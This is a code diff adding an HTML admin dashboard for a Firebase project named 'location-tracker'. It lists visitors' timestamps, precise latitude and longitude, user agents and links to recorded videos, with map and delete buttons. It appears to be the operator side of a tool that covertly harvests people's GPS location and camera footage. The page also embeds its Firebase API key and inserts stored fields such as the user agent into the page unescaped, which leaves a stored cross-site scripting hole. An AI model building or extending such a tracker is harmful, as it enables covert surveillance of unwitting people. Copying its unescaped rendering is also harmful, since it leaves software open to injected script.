@@ -1,0 +1,186 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Admin - Visitor Data</title>
+
+  <!-- Firebase -->
+  <script src="https://www.gstatic.com/firebasejs/9.22.2/firebase-app-compat.js"></script>
+  <script src="https://www.gstatic.com/firebasejs/9.22.2/firebase-database-compat.js"></script>
+
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      background: #f4f7fc;
+      padding: 20px;
+    }
+    h2 {
+      text-align: center;
+      margin-bottom: 10px;
+    }
+    .top-bar {
+      display: flex;
+      justify-content: flex-end;
+      margin-bottom: 15px;
+    }
+    .clear-btn {
+      padding: 8px 14px;
+      font-size: 14px;
+      background: #dc3545;
+      color: white;
+      border: none;
+      border-radius: 6px;
+      cursor: pointer;
+      transition: background 0.3s;
+    }
+    .clear-btn:hover {
+      background: #b52a37;
+    }
+    table {
+      width: 100%;
+      border-collapse: collapse;
+      background: white;
+      box-shadow: 0 2px 8px rgba(0,0,0,0.1);
+    }
+    th, td {
+      padding: 10px;
+      border: 1px solid #ddd;
+      text-align: center;
+      font-size: 14px;
+    }
+    th {
+      background: #007bff;
+      color: white;
+    }
+    button {
+      padding: 6px 12px;
+      font-size: 14px;
+      color: white;
+      border: none;
+      border-radius: 6px;
+      cursor: pointer;
+      transition: background 0.3s;
+    }
+    button.view {
+      background: #28a745;
+    }
+    button.view:hover {
+      background: #218838;
+    }
+    button.delete {
+      background: #dc3545;
+    }
+    button.delete:hover {
+      background: #b52a37;
+    }
+  </style>
+</head>
+<body>
+  <h2>📍 Visitor Location Data</h2>
+
+  <div class="top-bar">
+    <button class="clear-btn" onclick="deleteAll()">🗑 Remove All Data</button>
+  </div>
+
+  <table>
+    <thead>
+      <tr>
+        <th>#</th>
+        <th>Timestamp</th>
+        <th>Latitude</th>
+        <th>Longitude</th>
+        <th>Accuracy</th>
+        <th>User Agent</th>
+        <th>Video</th>
+        <th colspan="2">Actions</th>
+      </tr>
+    </thead>
+    <tbody id="dataTable"></tbody>
+  </table>
+
+  <script>
+    // 🔹 Your Firebase Config
+    const firebaseConfig = {
+      apiKey: "AIzaSyBlvUQ7EpySZ-4lvbWuKOan7XSrNvTHIq8",
+      authDomain: "location-tracker-d10ec.firebaseapp.com",
+      databaseURL: "https://location-tracker-d10ec-default-rtdb.firebaseio.com",
+      projectId: "location-tracker-d10ec",
+      storageBucket: "location-tracker-d10ec.firebasestorage.app",
+      messagingSenderId: "111876457066",
+      appId: "1:111876457066:web:78c76e424dff3dbcae8013",
+      measurementId: "G-CC2DC0L55R"
+    };
+
+    firebase.initializeApp(firebaseConfig);
+    const database = firebase.database();
+
+    const dataTable = document.getElementById("dataTable");
+
+    // Fetch visitor data
+    database.ref("visitors").on("value", (snapshot) => {
+      dataTable.innerHTML = "";
+      let count = 1;
+
+      if (!snapshot.exists()) {
+        dataTable.innerHTML = `<tr><td colspan="9">No data found</td></tr>`;
+        return;
+      }
+
+      snapshot.forEach((childSnapshot) => {
+        const key = childSnapshot.key;
+        const data = childSnapshot.val();
+
+        const row = `
+          <tr>
+            <td>${count++}</td>
+            <td>${data.timestamp || "-"}</td>
+            <td>${data.latitude || "-"}</td>
+            <td>${data.longitude || "-"}</td>
+            <td>${data.accuracy || "-"}</td>
+            <td>${data.userAgent || "-"}</td>
+            <td><a href="${data.videoUrl}" target="_blank">🎬 Video</a></td>
+            <td>
+              <button class="view" onclick="viewLocation(${data.latitude}, ${data.longitude})">
+                View
+              </button>
+            </td>
+            <td>
+              <button class="delete" onclick="deleteEntry('${key}')">
+                Remove
+              </button>
+            </td>
+          </tr>
+        `;
+        dataTable.innerHTML += row;
+      });
+    }, (error) => {
+      console.error("❌ Firebase read failed:", error);
+      dataTable.innerHTML = `<tr><td colspan="9">Error loading data</td></tr>`;
+    });
+
+    // Open location in Google Maps
+    function viewLocation(lat, lon) {
+      if (lat && lon && lat !== "-" && lon !== "-") {
+        window.open(`https://www.google.com/maps?q=${lat},${lon}`, "_blank");
+      } else {
+        alert("Location not available");
+      }
+    }
+
+    // Delete one entry
+    function deleteEntry(id) {
+      if (confirm("Are you sure you want to delete this entry?")) {
+        database.ref("visitors/" + id).remove();
+      }
+    }
+
+    // Delete all data
+    function deleteAll() {
+      if (confirm("⚠️ Are you sure you want to remove ALL data?")) {
+        database.ref("visitors").remove();
+      }
+    }
+  </script>
+</body>
+</html>
